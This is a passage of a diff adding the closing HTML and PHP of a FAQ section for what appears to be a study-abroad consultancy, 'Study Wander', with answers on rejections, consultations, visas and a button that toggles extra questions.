+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>While rejections can be tough, we’re here to help you explore backup options and find alternative universities that may be a better fit. We can help you adjust your application strategy or recommend other universities that offer similar programs.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           How can Study Wander make sure I’m making the right choice?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>We offer personalized, one-on-one consultations to thoroughly understand your goals, concerns, and preferences. We’re committed to providing expert advice based on your unique situation, helping you feel confident in your study abroad decision.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           I’m confused about the visa process. Can you help?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>
+                              Yes! The visa process can seem complicated, but our team will guide you through the requirements and help you gather the necessary documents. We ensure you understand the entire process, including visa interviews and travel arrangements, so you can study abroad without
+                              stress.
+                           </p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           What if I’m still unsure about studying abroad after talking to you?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>
+                              That’s completely okay! We want you to make a choice that feels right for you. If you’re still unsure, we can arrange additional sessions to clarify your doubts, offer more information, and even discuss alternative education options. We’re here to support you no matter
+                              what decision you make.
+                           </p>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+
+               <div class="d-flex justify-content-center mt-4">
+                  <button @click="show = !show" class="faq_show_btn" x-text="show ? 'Show Less' : 'View More Question'"></button>
+               </div>
+            </div>
+         </section>
+      </main>
+
+      <?php include("master/footer.php") ?>
+
+      <?php include("master/script.php") ?>
+      <script>
+         document.querySelector(".herosec-con video").playbackRate = 0.75;
+      </script>
+   </body>
+</html>
